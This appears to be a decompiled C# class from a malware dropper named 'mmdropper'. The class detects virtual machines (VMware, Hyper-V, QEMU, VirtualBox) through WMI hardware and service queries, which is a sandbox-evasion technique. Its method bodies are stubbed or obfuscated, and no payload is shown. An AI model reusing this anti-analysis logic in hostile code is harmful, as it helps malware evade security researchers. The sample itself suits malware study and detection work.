// Decompiled with JetBrains decompiler
// Type: VirtualMachineDetector
// Assembly: mmdropper, Version=1.0.7321.42228, Culture=neutral, PublicKeyToken=null
// MVID: 67C14436-991D-42DC-A31E-001F369439CC
// Assembly location: C:\Users\victim\Downloads\Release-1.0\eulascr-cleanstrings.exe

using System.Collections.Generic;
using System.Runtime.CompilerServices;

#nullable disable
public class VirtualMachineDetector
{
  private static IVirtualEnvironment[] _detectors;
  private static ComputerSystem _computer;
  private static BIOS _bios;
  private static MotherboardDevice _motherboard;
  private static IEnumerable<DiskDrive> _disks;
  private static IEnumerable<PnPEntity> _devices;
  private static IEnumerable<WindowsService> _services;

  static VirtualMachineDetector()
  {
    \u003CAgileDotNetRT\u003E.Initialize();
    \u003CAgileDotNetRT\u003E.PostInitialize();
    VirtualMachineDetector._detectors = new IVirtualEnvironment[4]
    {
      (IVirtualEnvironment) new VmWarePlayer(),
      (IVirtualEnvironment) new HyperVMachine(),
      (IVirtualEnvironment) new QEmuMachine(),
      (IVirtualEnvironment) new VirtualBoxMachine()
    };
    VirtualMachineDetector._computer = VirtualMachineDetector.Create<ComputerSystem>("Win32_ComputerSystem");
    VirtualMachineDetector._bios = VirtualMachineDetector.Create<BIOS>("Win32_BIOS");
    VirtualMachineDetector._motherboard = VirtualMachineDetector.Create<MotherboardDevice>("Win32_MotherboardDevice");
    VirtualMachineDetector._devices = (IEnumerable<PnPEntity>) VirtualMachineDetector.CreateList<PnPEntity>("Win32_PnPEntity");
    VirtualMachineDetector._disks = (IEnumerable<DiskDrive>) VirtualMachineDetector.CreateList<DiskDrive>("Win32_DiskDrive");
    VirtualMachineDetector._services = VirtualMachineDetector.GetWindowsServices();
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool Assert(out string name) => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public static bool Assert() => false;

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static IEnumerable<WindowsService> GetWindowsServices()
  {
    return (IEnumerable<WindowsService>) null;
  }

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static T Create<T>(string key) => default (T);

  [MethodImpl(MethodImplOptions.NoInlining)]
  private static List<T> CreateList<T>(string key) => (List<T>) null;

  [MethodImpl(MethodImplOptions.NoInlining)]
  public VirtualMachineDetector()
  {
  }
}
